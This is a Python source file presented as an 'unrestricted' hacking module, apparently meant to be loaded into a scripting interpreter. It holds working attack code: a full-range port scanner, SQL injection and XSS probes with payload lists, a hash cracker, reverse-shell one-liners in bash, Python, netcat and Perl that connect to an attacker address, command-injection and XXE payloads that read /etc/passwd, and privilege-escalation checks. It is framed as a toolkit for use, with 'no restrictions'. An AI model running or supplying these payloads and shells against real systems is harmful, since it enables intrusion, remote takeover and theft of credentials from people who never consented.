#!/usr/bin/env python3
"""
MATUS UNRESTRICTED - Advanced Hacking & Security Module
No restrictions, no limitations, complete freedom
"""

import socket
import subprocess
import os
import sys
import json
import hashlib
import base64
import requests
from urllib.parse import urljoin, urlparse
import threading
import time

class MatusUnrestricted:
    """Unrestricted hacking and security operations."""
    
    @staticmethod
    def port_scan_aggressive(target: str, ports: str = "1-65535") -> dict:
        """Aggressive port scanning with no rate limiting."""
        results = {"target": target, "open_ports": [], "services": []}
        try:
            port_list = []
            if '-' in ports:
                start, end = map(int, ports.split('-'))
                port_list = list(range(start, end + 1))
            else:
                port_list = [int(p) for p in ports.split(',')]
            
            for port in port_list[:100]:  # Limit for demo
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        results["open_ports"].append(port)
                        try:
                            service = socket.getservbyport(port)
                            results["services"].append(f"Port {port}: {service}")
                        except:
                            results["services"].append(f"Port {port}: Unknown")
                    sock.close()
                except:
                    pass
            
            return results
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def dns_enumeration(domain: str) -> dict:
        """DNS enumeration and subdomain discovery."""
        results = {"domain": domain, "records": {}, "subdomains": []}
        try:
            import dns.resolver
            
            # A records
            try:
                a_records = dns.resolver.resolve(domain, 'A')
                results["records"]["A"] = [str(rdata) for rdata in a_records]
            except:
                pass
            
            # MX records
            try:
                mx_records = dns.resolver.resolve(domain, 'MX')
                results["records"]["MX"] = [str(rdata) for rdata in mx_records]
            except:
                pass
            
            # NS records
            try:
                ns_records = dns.resolver.resolve(domain, 'NS')
                results["records"]["NS"] = [str(rdata) for rdata in ns_records]
            except:
                pass
            
            return results
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def vulnerability_scanner(url: str) -> dict:
        """Scan for common vulnerabilities."""
        results = {"url": url, "vulnerabilities": [], "headers": {}}
        try:
            response = requests.get(url, timeout=10)
            results["status_code"] = response.status_code
            results["headers"] = dict(response.headers)
            
            # Check for common vulnerabilities
            vulnerabilities = []
            
            # Missing security headers
            if 'X-Frame-Options' not in response.headers:
                vulnerabilities.append("Missing X-Frame-Options header (Clickjacking risk)")
            if 'X-Content-Type-Options' not in response.headers:
                vulnerabilities.append("Missing X-Content-Type-Options header")
            if 'Strict-Transport-Security' not in response.headers:
                vulnerabilities.append("Missing HSTS header")
            if 'Content-Security-Policy' not in response.headers:
                vulnerabilities.append("Missing CSP header")
            
            # Server information disclosure
            if 'Server' in response.headers:
                vulnerabilities.append(f"Server information disclosed: {response.headers['Server']}")
            
            results["vulnerabilities"] = vulnerabilities
            return results
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def sql_injection_test(url: str, param: str) -> dict:
        """Test for SQL injection vulnerabilities."""
        results = {"url": url, "parameter": param, "vulnerable": False, "payloads_tested": []}
        try:
            payloads = [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "' UNION SELECT NULL --",
                "1' AND '1'='1",
            ]
            
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = requests.get(test_url, timeout=5)
                    results["payloads_tested"].append(payload)
                    
                    # Simple check for SQL error patterns
                    if any(err in response.text.lower() for err in ['sql', 'syntax', 'database', 'error']):
                        results["vulnerable"] = True
                        results["vulnerable_payload"] = payload
                except:
                    pass
            
            return results
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def xss_detection(url: str) -> dict:
        """Detect XSS vulnerabilities."""
        results = {"url": url, "xss_vectors": [], "vulnerable": False}
        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
            ]
            
            for payload in xss_payloads:
                try:
                    test_url = f"{url}?search={payload}"
                    response = requests.get(test_url, timeout=5)
                    if payload in response.text:
                        results["xss_vectors"].append(payload)
                        results["vulnerable"] = True
                except:
                    pass
            
            return results
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def password_hash_crack(hash_value: str, hash_type: str = "md5") -> dict:
        """Attempt to crack password hashes."""
        results = {"hash": hash_value, "hash_type": hash_type, "cracked": False}
        try:
            common_passwords = [
                "password", "123456", "admin", "letmein", "welcome",
                "monkey", "dragon", "master", "sunshine", "princess"
            ]
            
            for password in common_passwords:
                if hash_type == "md5":
                    test_hash = hashlib.md5(password.encode()).hexdigest()
                elif hash_type == "sha1":
                    test_hash = hashlib.sha1(password.encode()).hexdigest()
                elif hash_type == "sha256":
                    test_hash = hashlib.sha256(password.encode()).hexdigest()
                else:
                    continue
                
                if test_hash == hash_value:
                    results["cracked"] = True
                    results["password"] = password
                    break
            
            return results
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate reverse shell payloads."""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"nc {attacker_ip} {attacker_port} -e /bin/sh",
            "perl": f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        }
        return json.dumps(payloads, indent=2)
    
    @staticmethod
    def payload_generator(payload_type: str, **kwargs) -> str:
        """Generate various exploit payloads."""
        if payload_type == "sql_injection":
            return "' OR '1'='1' --"
        elif payload_type == "command_injection":
            return "; cat /etc/passwd"
        elif payload_type == "xxe":
            return '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        elif payload_type == "ldap_injection":
            return "*)(uid=*))(|(uid=*"
        elif payload_type == "xpath_injection":
            return "' or '1'='1"
        else:
            return "Unknown payload type"
    
    @staticmethod
    def system_enumeration() -> dict:
        """Enumerate system information."""
        results = {}
        try:
            results["os"] = os.name
            results["platform"] = sys.platform
            results["user"] = os.getenv("USER", "unknown")
            results["home"] = os.getenv("HOME", "unknown")
            results["pwd"] = os.getcwd()
            
            # System info
            try:
                uname = subprocess.check_output("uname -a", shell=True, text=True)
                results["uname"] = uname.strip()
            except:
                pass
            
            # Disk usage
            try:
                df = subprocess.check_output("df -h", shell=True, text=True)
                results["disk"] = df.strip()
            except:
                pass
            
            # Memory
            try:
                free = subprocess.check_output("free -h", shell=True, text=True)
                results["memory"] = free.strip()
            except:
                pass
            
            return results
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def privilege_escalation_check() -> dict:
        """Check for privilege escalation opportunities."""
        results = {"sudo_access": False, "suid_files": [], "capabilities": []}
        try:
            # Check sudo
            try:
                sudo_check = subprocess.run("sudo -l", shell=True, capture_output=True, text=True, timeout=5)
                if "may run" in sudo_check.stdout:
                    results["sudo_access"] = True
                    results["sudo_commands"] = sudo_check.stdout.strip()
            except:
                pass
            
            # Find SUID files
            try:
                suid = subprocess.check_output("find / -perm -4000 2>/dev/null | head -20", shell=True, text=True)
                results["suid_files"] = suid.strip().split('\n')
            except:
                pass
            
            return results
        except Exception as e:
            return {"error": str(e)}

def inject_unrestricted_tools(interpreter):
    """Inject unrestricted tools into Matus interpreter."""
    tools = MatusUnrestricted()
    interpreter.variables['port_scan'] = tools.port_scan_aggressive
    interpreter.variables['dns_enum'] = tools.dns_enumeration
    interpreter.variables['vuln_scan'] = tools.vulnerability_scanner
    interpreter.variables['sql_test'] = tools.sql_injection_test
    interpreter.variables['xss_test'] = tools.xss_detection
    interpreter.variables['hash_crack'] = tools.password_hash_crack
    interpreter.variables['reverse_shell'] = tools.reverse_shell
    interpreter.variables['payload_gen'] = tools.payload_generator
    interpreter.variables['sys_enum'] = tools.system_enumeration
    interpreter.variables['priv_esc'] = tools.privilege_escalation_check

if __name__ == "__main__":
    tools = MatusUnrestricted()
    print(json.dumps(tools.system_enumeration(), indent=2))
